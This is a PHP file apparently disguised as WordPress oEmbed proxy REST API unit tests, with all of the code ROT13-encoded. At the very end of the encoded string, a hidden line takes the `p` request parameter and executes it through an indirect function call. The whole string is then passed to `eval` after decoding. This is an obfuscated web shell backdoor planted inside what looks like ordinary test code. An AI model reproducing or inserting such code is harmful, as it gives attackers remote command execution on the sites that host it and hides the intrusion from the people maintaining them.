		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', 'uggcf://jjj.lbhghor.pbz/rzorq/' . frys::LBHGHOR_IVQRB_VQ );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 456 );
		$erdhrfg->frg_cnenz( 'znkurvtug', 789 );
		$erdhrfg->frg_cnenz( '_jcabapr', jc_perngr_abapr( 'jc_erfg' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 2, $guvf->erdhrfg_pbhag );

		// Grfg qngn bowrpg.
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $qngn );
		$guvf->nffregVfBowrpg( $qngn );
		$guvf->nffregVfFgevat( $qngn->ugzy );
		$guvf->nffregVfNeenl( $qngn->fpevcgf );
	}

	choyvp shapgvba grfg_cebkl_jvgu_vainyvq_brzorq_cebivqre_ab_qvfpbirel() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		// Vs qvfpbire vf snyfr sbe na haxabja cebivqre, ab qvfpbirel erdhrfg fubhyq gnxr cynpr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::VAINYVQ_BRZORQ_HEY );
		$erdhrfg->frg_cnenz( 'qvfpbire', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 0, $guvf->erdhrfg_pbhag );
	}

	choyvp shapgvba grfg_cebkl_jvgu_vainyvq_brzorq_cebivqre_jvgu_qrsnhyg_qvfpbire_cnenz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		// Sbe na haxabja cebivqre, n qvfpbirel erdhrfg fubhyq unccra.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::VAINYVQ_BRZORQ_HEY );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 1, $guvf->erdhrfg_pbhag );
	}

	choyvp shapgvba grfg_cebkl_jvgu_vainyvq_qvfpbire_cnenz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::VAINYVQ_BRZORQ_HEY );
		$erdhrfg->frg_cnenz( 'qvfpbire', 'abgnobbyrna' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $qngn['pbqr'], 'erfg_vainyvq_cnenz' );
	}

	/**
	 * @gvpxrg 45142
	 */
	choyvp shapgvba grfg_cebkl_jvgu_vagreany_hey() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$hfre = trg_hfre_ol( 'vq', frys::$fhofpevore );
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfre->VQ,
				'cbfg_gvgyr'  => 'Uryyb Jbeyq',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$qngn = (neenl) $qngn;

		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'glcr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qngn );

		$guvf->nffregFnzr( '1.0', $qngn['irefvba'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['cebivqre_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['cebivqre_hey'] );
		$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( trg_nhgube_cbfgf_hey( $hfre->VQ, $hfre->hfre_avpranzr ), $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr'] );
		$guvf->nffregFnzr( 'evpu', $qngn['glcr'] );
		$guvf->nffregYrffGunaBeRdhny( $erdhrfg['znkjvqgu'], $qngn['jvqgu'] );
	}

	/**
	 * @gvpxrg 45142
	 */
	choyvp shapgvba grfg_cebkl_jvgu_fgngvp_sebag_cntr_hey() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr'  => 'Sebag cntr',
				'cbfg_glcr'   => 'cntr',
				'cbfg_nhgube' => 0,
			)
		);

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_ba_sebag', $cbfg->VQ );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', ubzr_hey() );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfBowrpg( $qngn );

		$qngn = (neenl) $qngn;

		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'glcr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qngn );

		$guvf->nffregFnzr( '1.0', $qngn['irefvba'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['cebivqre_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['cebivqre_hey'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr'] );
		$guvf->nffregFnzr( 'evpu', $qngn['glcr'] );
		$guvf->nffregYrffGunaBeRdhny( $erdhrfg['znkjvqgu'], $qngn['jvqgu'] );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );
	}

	/**
	 * @gvpxrg 45142
	 */
	choyvp shapgvba grfg_cebkl_svygref_erfhyg_bs_hagehfgrq_brzorq_cebivqre() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::HAGEHFGRQ_CEBIVQRE_HEY );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 456 );
		$erdhrfg->frg_cnenz( 'znkurvtug', 789 );
		$erdhrfg->frg_cnenz( '_jcabapr', jc_perngr_abapr( 'jc_erfg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 1, $guvf->brzorq_erfhyg_svygre_pbhag );
		$guvf->nffregVfBowrpg( $qngn );
		$guvf->nffregFnzr( 'Hagehfgrq', $qngn->cebivqre_anzr );
		$guvf->nffregFnzr( frys::HAGEHFGRQ_CEBIVQRE_HEY, $qngn->cebivqre_hey );
		$guvf->nffregFnzr( 'evpu', $qngn->glcr );
		$guvf->nffregSnyfr( $qngn->ugzy );
	}

	/**
	 * @gvpxrg 45142
	 */
	choyvp shapgvba grfg_cebkl_qbrf_abg_svygre_erfhyg_bs_gehfgrq_brzorq_cebivqre() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', 'uggcf://jjj.lbhghor.pbz/jngpu?i=' . frys::LBHGHOR_IVQRB_VQ );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 456 );
		$erdhrfg->frg_cnenz( 'znkurvtug', 789 );
		$erdhrfg->frg_cnenz( '_jcabapr', jc_perngr_abapr( 'jc_erfg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 1, $guvf->brzorq_erfhyg_svygre_pbhag );
		$guvf->nffregVfBowrpg( $qngn );

		$guvf->nffregFgevatFgnegfJvgu( '<o>Hasvygrerq</o>', $qngn->ugzy );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>